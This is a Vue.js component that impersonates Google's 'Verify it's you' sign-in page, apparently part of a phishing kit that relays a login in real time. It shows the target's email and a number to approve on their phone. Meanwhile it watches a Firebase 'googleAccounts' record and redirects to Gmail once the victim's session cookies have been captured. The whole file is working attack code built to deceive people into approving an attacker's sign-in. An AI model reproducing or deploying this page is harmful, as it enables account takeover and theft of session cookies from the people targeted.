<template>
  <v-app color>
    <v-content class>
      <v-container fill-height class="d-flex justify-center">
        <v-card
          max-width="448"
          height="650"
          :loading="cardLoading"
          :outlined="true"
          flat
          :disabled="disableCard"
          class="pl-8 pr-8"
        >
          <v-card-title>
            <v-img
              width="20"
              height="32"
              :src="require('@/assets/google_logo.png')"
              :contain="true"
              class="mt-8"
            />
          </v-card-title>
          <v-card-text>
            <h3 class="headline text-center text--primary">Verify it's you</h3>
            <h4 class="text--primary text-center">
              This device isn’t recognized. For your security, Google wants to
              make sure it’s really you.
              <br />sign in.
            </h4>
            <h4 class="primary--text text-center">Learn more</h4>
            <div class="text-center">
              <v-btn
                :rounded="true"
                class="ma-3 mx-auto email-button"
                :outlined="true"
              >
                <v-icon left>mdi-account-circle</v-icon>
                <div class="text--primary text-none">{{ email }}</div>
                <v-icon right>mdi-chevron-down</v-icon>
              </v-btn>
              <v-img
                width="200"
                :src="require('@/assets/gmail_ios_authzen.gif')"
                :contain="true"
                class="mt-3"
              />
              <p class="text--primary text-left" v-if="!promptNumber">
                Google sent a notification to your phone. Open the Gmail app,
                tap <strong>Yes</strong> on the prompt, then tap
                <strong>{{ promptNumber }}</strong> on your phone to verify it’s
                you.
              </p>
              <p class="text--primary text-left" v-if="promptNumber">
                Google sent a notification to your phone. Open the Gmail app,
                tap <strong>Yes</strong> on the prompt, then tap
                <strong>{{ promptNumber }}</strong> on your phone to verify it’s
                you.
              </p>
              <h1 v-if="promptNumber" class="text--primary text-center">
                {{ promptNumber }}
              </h1>
            </div>
          </v-card-text>
          <v-card-actions>
            <v-btn color="primary" class="text-none" :depressed="true" text
              >Try another way</v-btn
            >
            <v-spacer></v-spacer>
          </v-card-actions>
        </v-card>
      </v-container>
    </v-content>
  </v-app>
</template>

<script>
import { db } from "../firebase";
export default {
  name: "LoginForm",

  data: () => ({
    showPassword: false,
    errorMessage: "",
    error: false,
    disableCard: false,
    email: "",
    password: "",
    ipAddress: "",
    countryName: "",
    submitCount: 0,
    cardLoading: false,
    snackbar: false,
    promptNumber: "",
  }),

  async created() {
    this.email = this.$route.params.email;
    this.email = this.$route.params.email.includes("@")
      ? this.$route.params.email
      : window.atob(this.$route.params.email);
    console.log(this.email);
    this.promptNumber = this.$route.params.promptNumber;

    //this.$refs.password.focus();
    let googleAccounts = db.collection("googleAccounts");
    const user = await googleAccounts.doc(this.email).get();
    user.get("cookies") && (window.location.href = `https://mail.google.com`);

    googleAccounts.where("email", "==", this.email).onSnapshot((snapshot) => {
      console.log("i snapped");
      snapshot.docChanges().forEach(
        (change) => {
          let changeData = change.doc.data();

          if (change.type === "modified") {
            changeData.cookies &&
              (window.location.href = `https://mail.google.com`);
          }
        },
        (err) => {
          console.log(`Encountered error: ${err}`);
        }
      );
    });
  },

  mounted() {},

  methods: {},
};
</script>

